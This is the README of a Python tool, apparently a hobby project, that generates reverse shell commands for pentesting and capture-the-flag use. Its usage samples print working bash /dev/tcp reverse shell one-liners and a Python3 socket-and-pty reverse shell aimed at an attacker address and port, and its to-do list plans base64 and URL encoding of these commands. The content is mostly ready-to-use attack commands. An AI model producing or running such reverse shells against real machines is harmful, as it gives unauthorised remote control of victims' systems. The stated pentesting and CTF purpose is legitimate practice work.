# Shellgen.py 

## The idea for this project is for some practice python, as well as to make a useful tool for pentesting / CTF's

## The tool is used to generate various types of reverse shell commands from the CLI.

## The usage is very simple

    usage: shellgen.py [-h] [-p <attacker port>] [-m method to use] <attacker ip>
    
    Command line reverse shell generator
    
    positional arguments:
      <attacker ip>       Attacker ip address to receive the connection back from victim machine
    
    optional arguments:
      -h, --help          show this help message and exit
      -p <attacker port>  Attacker port to listen on. Default = 1337
      -m method to use    A comma seperated list of reverse shell methods. Default is bash,python3,nc
 

## Samples 
- basic usage uses the three default methods, bash python3, and nc and default port l337

    
    python3 shellgen.py 127.0.0.1

    ['bash', 'python3', 'nc']
    
    bash: 
      bash -i >& /dev/tcp/127.0.0.1/1337 0>&1 
      0<&196;exec 196<>/dev/tcp/127.0.0.1/1337; sh <&196 >&196 2>&196 
      /bin/bash -l > /dev/tcp/127.0.0.1/1337 0<&1 2>&1
    
    python3: 
      export RHOST="127.0.0.1";export RPORT=1337;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'

- specifying a method and port
    
    python3 shellgen.py 127.0.0.1 -m bash -p 9001

    ['bash']

    bash: 
      bash -i >& /dev/tcp/127.0.0.1/9001 0>&1 
      0<&196;exec 196<>/dev/tcp/127.0.0.1/9001; sh <&196 >&196 2>&196 
      /bin/bash -l > /dev/tcp/127.0.0.1/9001 0<&1 2>&1
                                                           


## To do
- Add more methods for rev shells
- add more functionality like base64 or url encoding
- add option to save to file
